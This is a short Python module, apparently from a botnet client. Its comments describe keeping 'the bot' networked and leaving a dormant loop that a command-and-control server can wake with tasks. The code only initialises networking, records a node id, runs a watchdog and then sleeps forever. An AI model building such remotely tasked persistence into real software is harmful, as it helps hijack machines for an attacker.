# keepalive.py — keeps the bot alive and networked.
# brings up sockets, caches node id, fires watchdog once at boot,
# then dormant loop. cnc can wake the loop with a task later.

import time


def start():
    from . import netinit, watchdog
    netinit.bringup()
    netinit.nodeid()
    watchdog.check()
    while True:
        time.sleep(300)
